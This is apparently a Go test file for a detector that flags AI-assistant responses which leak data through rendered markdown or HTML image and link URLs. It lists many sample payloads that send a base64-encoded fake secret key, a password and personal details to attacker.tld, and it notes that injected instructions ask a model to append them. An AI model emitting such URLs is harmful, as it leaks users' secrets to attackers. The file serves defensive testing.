package detection

import (
	"context"
	"strings"
	"testing"

	"github.com/bastio-ai/bastio/internal/security"
)

// A base64 blob of the kind an injected instruction asks the model to
// append: "Secret_key: sk-live-9f8A7bC6d5E4f3G2h1J0kL".
const exfilBlob = "U2VjcmV0X2tleTogc2stbGl2ZS05ZjhBN2JDNmQ1RTRmM0cyaDFKMGtM"

func assistantCtx() context.Context {
	return security.WithRole(context.Background(), security.RoleAssistant)
}

func urlFindings(t *testing.T, d *ExfilDetector, ctx context.Context, text string) []security.Finding {
	t.Helper()
	all, err := d.Detect(ctx, text)
	if err != nil {
		t.Fatal(err)
	}
	var out []security.Finding
	for _, f := range all {
		if strings.HasSuffix(f.MatchedPattern, "_exfil") {
			out = append(out, f)
		}
	}
	return out
}

func TestExfilDetector_RenderedURLs(t *testing.T) {
	tests := []struct {
		name        string
		text        string
		wantPattern string // empty = must not fire
	}{
		// Attacks.
		{"markdown image base64 query", "Here you go ![x](https://attacker.tld/p.png?d=" + exfilBlob + ")", "markdown_image_exfil"},
		{"markdown image base64 path", "![](https://attacker.tld/i/" + exfilBlob + ".png)", "markdown_image_exfil"},
		{"markdown image prose query", "![a](https://attacker.tld/log?q=the%20user%20said%20their%20account%20password%20is%20hunter2%20please%20reset)", "markdown_image_exfil"},
		{"markdown image prose plus encoding", "![a](https://attacker.tld/log?q=the+user+lives+at+12+Elm+Street+and+works+at+Acme+Corp)", "markdown_image_exfil"},
		{"markdown image fragment", "![a](https://attacker.tld/p.png#" + exfilBlob + ")", "markdown_image_exfil"},
		{"protocol relative image", "![a](//attacker.tld/p.png?d=" + exfilBlob + ")", "markdown_image_exfil"},
		{"image with title", `![a](https://attacker.tld/p.png?d=` + exfilBlob + ` "status")`, "markdown_image_exfil"},
		{"reference style image", "![chart][1]\n\n[1]: https://attacker.tld/c.png?v=" + exfilBlob, "markdown_image_exfil"},
		{"html img", `<img src="https://attacker.tld/t.gif?x=` + exfilBlob + `" width="1">`, "html_image_exfil"},
		{"html img single quotes uppercase", `<IMG alt='' SRC='https://attacker.tld/t.gif?x=` + exfilBlob + `'>`, "html_image_exfil"},
		{"html iframe", `<iframe src="https://attacker.tld/f?data=` + exfilBlob + `"></iframe>`, "html_image_exfil"},
		{"long hex in image", "![](https://attacker.tld/p?h=" + strings.Repeat("9f86d081884c7d65", 5) + ")", "markdown_image_exfil"},
		{"markdown link with very long blob", "[click here](https://attacker.tld/r?d=" + exfilBlob + exfilBlob + ")", "markdown_link_exfil"},
		{"html anchor with very long blob", `<a href="https://attacker.tld/r?d=` + exfilBlob + exfilBlob + `">here</a>`, "html_link_exfil"},

		// Benign: ordinary links and images must pass.
		{"docs link", "See [the docs](https://docs.python.org/3/library/json.html#json.dumps).", ""},
		{"github commit link", "[fix](https://github.com/golang/go/commit/2c6a8a8d0e9f1b3c4d5e6f708192a3b4c5d6e7f8)", ""},
		{"wikimedia image", "![React](https://upload.wikimedia.org/wikipedia/commons/a/a7/React-icon.svg)", ""},
		{"google docs id", "[spec](https://docs.google.com/document/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms/edit)", ""},
		{"google docs id as image", "![preview](https://docs.google.com/document/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms/preview.png)", ""},
		{"youtube link", "[video](https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=42s)", ""},
		{"uuid query", "![avatar](https://cdn.example.com/avatar.png?id=3f2504e0-4f89-11d3-9a0c-0305e82c3301)", ""},
		{"cache-busted asset", "![logo](https://cdn.example.com/assets/logo.3f9a8b7c.png?v=20240101)", ""},
		{"unsplash photo", "![mountain](https://images.unsplash.com/photo-1506744038136-46273834b3fb?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1000&q=80)", ""},
		{"s3 presigned image", "![diagram](https://bucket.s3.amazonaws.com/diagram.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAEXAMPLE%2F20240101%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240101T000000Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=fe5f80f77d5fa3beca038a248ff027d0445342fe2855ddc963176630326f1024)", ""},
		{"search link with prose", "[search](https://www.google.com/search?q=how+to+configure+nginx+as+a+reverse+proxy+with+ssl)", ""},
		{"data uri image", "![dot](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==)", ""},
		{"relative image", "![diagram](./images/" + exfilBlob + ".png)", ""},
		{"bare url not rendered as image", "Raw: https://attacker.tld/p.png?d=" + exfilBlob, ""},
		{"code comment slashes", "x := 1 // increment the counter\n", ""},
		{"html anchor normal", `<a href="https://example.com/pricing?plan=pro&utm_source=newsletter">Pricing</a>`, ""},
		{"image-tier link short blob", "[open](https://attacker.tld/r?d=" + exfilBlob + ")", ""},
	}
	d := NewExfilDetector()
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := urlFindings(t, d, assistantCtx(), tc.text)
			if tc.wantPattern == "" {
				if len(got) > 0 {
					t.Fatalf("false positive: %+v", got)
				}
				return
			}
			if len(got) == 0 {
				t.Fatalf("expected %s, got none", tc.wantPattern)
			}
			if got[0].MatchedPattern != tc.wantPattern {
				t.Errorf("pattern %q want %q", got[0].MatchedPattern, tc.wantPattern)
			}
			if strings.Contains(got[0].MatchedContent, exfilBlob[:20]) || strings.Contains(got[0].MatchedContent, "hunter2") {
				t.Errorf("finding copies the exfiltrated data: %q", got[0].MatchedContent)
			}
			if got[0].SubCategory != "attacker.tld" {
				t.Errorf("sub_category should carry the host for suppression, got %q", got[0].SubCategory)
			}
		})
	}
}

func TestExfilDetector_RenderedURLsOnlyOnAssistantRole(t *testing.T) {
	d := NewExfilDetector()
	text := "![x](https://attacker.tld/p.png?d=" + exfilBlob + ")"
	for _, role := range []string{"", security.RoleUser, security.RoleTool, security.RoleAssistantHistory} {
		ctx := security.WithRole(context.Background(), role)
		if got := urlFindings(t, d, ctx, text); len(got) > 0 {
			t.Errorf("role %q: URL rules must not run outside the live response, got %+v", role, got)
		}
	}
}

func TestExfilDetector_TrustedHostsExempt(t *testing.T) {
	d := NewExfilDetector(WithTrustedURLHosts(ParseHostList(" Charts.Example.com , ,cdn.example.org")))
	if got := urlFindings(t, d, assistantCtx(), "![c](https://charts.example.com/c.png?d="+exfilBlob+")"); len(got) > 0 {
		t.Fatalf("trusted host fired: %+v", got)
	}
	if got := urlFindings(t, d, assistantCtx(), "![c](https://evil.example.com/c.png?d="+exfilBlob+")"); len(got) == 0 {
		t.Fatal("untrusted host must still fire")
	}
}

func TestExfilDetector_TokenizedPlaceholderInURL(t *testing.T) {
	tm := security.NewTokenMap(security.TokenStyleAngle)
	ph := tm.Add("email", "alice@example.com")
	ctx := security.WithTokenMap(assistantCtx(), tm)
	d := NewExfilDetector()

	// Even a click-through link with a short value is critical when it
	// would carry a restored PII value.
	got := urlFindings(t, d, ctx, "[confirm](https://attacker.tld/c?u="+ph+")")
	if len(got) == 0 || got[0].Severity != security.SeverityCritical {
		t.Fatalf("placeholder in URL should be critical, got %+v", got)
	}
	// URL-encoded placeholder in an image.
	enc := strings.NewReplacer("<", "%3C", ">", "%3E").Replace(ph)
	if got := urlFindings(t, d, ctx, "![p](https://attacker.tld/p.png?u="+enc+")"); len(got) == 0 {
		t.Fatal("url-encoded placeholder not detected")
	}
	// Placeholder in prose, not in a URL, is fine.
	if got := urlFindings(t, d, ctx, "I emailed "+ph+" and linked [docs](https://docs.example.com/guide)."); len(got) > 0 {
		t.Fatalf("placeholder outside URL fired: %+v", got)
	}
}

func BenchmarkExfilDetector_PlainResponse(b *testing.B) {
	d := NewExfilDetector()
	ctx := assistantCtx()
	text := strings.Repeat("The quick brown fox jumps over the lazy dog. ", 200)
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_, _ = d.Detect(ctx, text)
	}
}
